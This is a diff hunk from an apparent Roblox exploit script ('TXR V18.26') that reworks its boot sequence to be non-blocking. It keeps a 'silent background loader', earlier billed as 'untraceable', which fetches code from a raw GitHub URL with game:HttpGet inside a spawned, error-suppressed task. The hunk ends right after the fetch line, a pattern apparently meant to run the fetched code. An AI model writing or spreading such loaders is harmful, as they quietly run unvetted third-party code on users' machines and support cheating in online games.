@@ -32,22 +32,15 @@ pcall(function()
     end
 end)
 -- =========================================================
--- 🛡️ TXR V18.26: QUANTUM ANTI-GLITCH & SAFE-BOOT ENGINE 🛡️
+-- 🛡️ TXR V18.26: NON-BLOCKING SAFE-BOOT ENGINE 🛡️
 -- =========================================================
-if not game:IsLoaded() then 
-    pcall(function() game.Loaded:Wait() end)
-end
+task.spawn(function()
+    if not game:IsLoaded() then 
+        pcall(function() game.Loaded:Wait() end)
+    end
+end)
 
-local _TEMP_PLAYERS = game:GetService("Players")
-local _TEMP_LP = _TEMP_PLAYERS.LocalPlayer or _TEMP_PLAYERS.PlayerAdded:Wait()
-
-if not _TEMP_LP.Character or not _TEMP_LP.Character:FindFirstChild("HumanoidRootPart") then
-    local char = _TEMP_LP.Character or _TEMP_LP.CharacterAdded:Wait()
-    pcall(function() char:WaitForChild("HumanoidRootPart", 5) end)
-end
--- =========================================================
-
--- 🔌 SILENT BACKGROUND LOADER (100% WORKING & UNTRACEABLE)
+-- 🔌 SILENT BACKGROUND LOADER (NON-BLOCKING)
 task.spawn(function()
     pcall(function()
         local code = game:HttpGet("https://raw.githubusercontent.com/yelelode/Delta/refs/heads/main/EMP", true)
